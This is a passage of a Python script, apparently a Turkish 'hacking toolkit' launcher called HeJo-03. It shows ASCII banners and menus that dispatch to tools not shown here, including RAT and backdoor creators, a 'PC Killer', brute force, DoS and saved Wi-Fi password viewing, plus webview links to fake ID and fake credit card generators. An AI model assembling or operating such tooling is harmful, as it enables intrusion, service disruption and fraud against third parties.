            window = webview.create_window('SMM Panel', 'https://zefoy.com/')

            webview.start()
    print('''
    [1] SMM Panel
    [98] Üst Menü
    [99] Çıkış
    ''')
    sec = input(f"HeJo@{user}:~/SmmPanel$ ")
    if sec == "1":
        sma()
    elif sec == "98":
        main()
    elif sec == "99":
        quit()
    else:
        print("Hatalı Seçim! Lütfen tekrar deneyin.")
    
def sahte():
    def kimlik():
        
        # Web sayfasını açmak için bir pencere oluştur
        window = webview.create_window('Kimlik Oluşturucu', 'https://kimlikolusturucu.github.io/')

        # Pencereyi başlat
        webview.start()
    def kredi():
        
        # Web sayfasını açmak için bir pkencere oluştur
        window = webview.create_window('Kart Oluşturucu', 'https://webmastersbox.com/tr/credit-card-generator')

        # Pencereyi başlat
        webview.start()

    print('''
[1] Sahte Kimlik Oluşturucu
[2] Sahte Kredi Kartı Olşturucu
[98] Üst Menü
[99] Çıkış
''')
    sec = input(f"HeJo@{user}:~/Sahte$ ")
    if sec == "1":
        kimlik()
    elif sec == "2":
        kredi()
    elif sec == "98":
        main()
    elif sec == "99":
        quit()
    else:
        print("Hatalı Seçim! Lütfen tekrar deneyin.")
def rat():
    print('''
[1] Pc Killer
[2] BackDoor Oluşturucu
[3] Telegram Bot Rat
''')
    secim = input(f"HeJo@{user}:~/Rat$ ")
    if secim == "1":
        pcKiller()
    elif secim == "2":
        trojenOluşturucu()
    elif secim == "3":
        telegram()

def istatislik():
    print(random_renk)
    print('''
[1] Kayıtlı Wifi Ağlarını ve şifrelerini Görüntüleme
[98] Üst Menüye Dön
[99] Çıkış
        ''')
    secim = input(f"HeJo@{user}:~/İstatistik$ ")
    if secim == "1":
        wifiAğları()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()
def main():  
    text1= '''

|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
　　　　　HeJo-03
|＿＿＿＿＿＿＿＿＿＿＿＿＿＿| 
(\__/) || 
(•ㅅ•).|| 
/ . . .づ

'''
    text2 = '''

             /||        |
            / //        |
          .(  )))       |
        .(  )    \      |
      .(  )'  @   \     |
    .(  )'         \    |
  .(  )'    |       \   |
.(  )'      /\__     \  |
  )'       /    \    O| |
)'        /      \_\_/  |
         /        ______o
         |       |  ___/|
         |       `.____.'
       HeJo-03

'''
    text3='''


                 -----------!-----------
-----------!-----------  /=====\
          |===\_________/_  o  |
         /_]    o o  o o____   /
        <_]___[]_______<____>/
            o              o
            HeJo-03


'''
    text4 = '''

          _____
         |A .  | _____
         | /.\ ||A ^  | _____
         |(_._)|| / \ ||A _  | _____
         |  |  || \ / || ( ) ||A_ _ |
         |____V||  .  ||(_'_)||( v )|
                |____V||  |  || \ / |
                       |____V||  .  |
                              |____V|
                HeJo-03


'''
    text5 = '''

───▄█▌─▄─▄─▐█▄
───██▌▀▀▄▀▀▐██
───██▌─▄▄▄─▐██
───▀██▌▐█▌▐██▀
▄██████─▀─██████▄
HeJo-03

'''
    text6 = '''
       _  __________=__
        \\@([____]_____()
       _/\|-[____]
      /     /(( )
     /____|'----'
     \____/  
HeJo-03
'''
    text7='''
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
          ░░▒▒▒▒░░▒▒                              ▒▒▒▒▒▒██░░░░        
        ██▒▒▒▒▒▒  ▒▒▒▒▓▓                      ▒▒▒▒▒▒  ▒▒██▒▒▒▒░░      
    ▒▒▒▒▒▒▒▒  ▒▒▓▓▒▒▒▒██                      ██▒▒░░▒▒▒▒  ░░▓▓██▒▒    
    ▒▒▓▓░░████░░░░██▒▒████░░                ▒▒██▒▒██░░░░▓▓██▒▒  ░░    
    ▒▒██▒▒▒▒▓▓▒▒░░▓▓▒▒▓▓▒▒██▒▒          ░░██▓▓▓▓▒▒██▒▒░░▓▓██▒▒▓▓▒▒░░  
  ██▒▒▒▒▒▒▒▒▒▒░░▒▒██▒▒▓▓▒▒▓▓▒▒▓▓      ▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░
██▒▒▒▒▒▒░░▓▓░░▓▓██  ▒▒██▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▓▓▒▒██▒▒▒▒██
▓▓▒▒▓▓▒▒▒▒▓▓            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓            ▓▓▒▒▒▒▒▒▒▒▒▒
  ▒▒████▓▓▒▒              ██░░▓▓▒▒▒▒▓▓▒▒▒▒▒▒              ██▒▒░░██▒▒▒▒
  ▓▓░░▒▒▒▒██▓▓▒▒        ░░▒▒▒▒▓▓▓▓▒▒▓▓▓▓▒▒▓▓▒▒          ▓▓██░░░░░░▓▓  
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓██▒▒▓▓▒▒▒▒▒▒░░▒▒▓▓▒▒▒▒▒▒▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒  
      ▒▒▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒░░      ░░▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██    
        ██▒▒▓▓▒▒██▓▓▒▒▒▒▒▒▓▓▒▒          ░░▓▓██▒▒▒▒▒▒██▓▓▓▓▒▒▓▓▒▒      
          ▓▓▓▓▒▒▓▓▒▒▒▒████░░                ▓▓██▓▓▒▒▒▒▒▒▓▓▓▓          
              ▒▒██▓▓██                          ██▓▓████              
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
██████████████████████████████████████████████████████████████████████
██▒▒▓▓▒▒▒▒▒▒▒▒▓▓███████████     HeJo-03   ██████████▒▒▓▓▒▒▒▒▓▓▓▓▒▒▒▒▓▓
██████████████████████████████████████████████████████████████████████

'''
    text = [text1,text2,text3,text4,text5,text6,text7]
    rndtext= random.choice(text)
    while True:
        print(random_renk)
        print(f'''
              
{rndtext}
    [1] Sosyal Medya Tooları    [2] Web Tooları

    [3] Brute Force Tolları     [4] Doğrudan Cihaza Yapılan Saldırı Tooları    
        
    [5] Kriptoloji Tooları      [6] İstatislik
        
    [7] Anonim Chat             [8] Rat
              
    [9] Sahte                   [10] SMM Tool

    [11] Hazır Scriptler        [12] Dos
              
    [88] Tüm Toolar             [99] Çıkış
            
    Discord : https://discord.gg/eAknugSZZ7
    instagram : bymer_ak
    ''')
        
        a = int(input(f"HeJo@{user}:~$ "))
        if a == 1:
            sosyalMedyaToolları()
        elif a == 2:
            webTooları()
        elif a == 3:
            bruderForceTooları()
        elif a == 4:
            DoğrudanCihazaYapılanSaldırıTooları()
        elif a == 5:
            kriptolojiTooları()
        elif a == 6:
            istatislik()
        elif a == 7:
            anonimChat()
        elif a == 8:
            rat()
        elif a == 9:
            sahte()
        elif a == 10:
            smm()
        elif a == 11:
            hazırScript()
        elif a == 12:
            dos()
        elif a == 88:
            tümToolar()
        elif a == 98:
            print('''100110001 00100000 01100001 01101100 01110111 
    01100001 01111001 01110011 00100000 01101100 
    01101111 01110110 01100101 00100000
     01101101 01111001 00100000 01100111 
    01110111 01100101 01101110 ''')
        elif a == 99:
            exit()
if __name__ == "__main__":
    main()
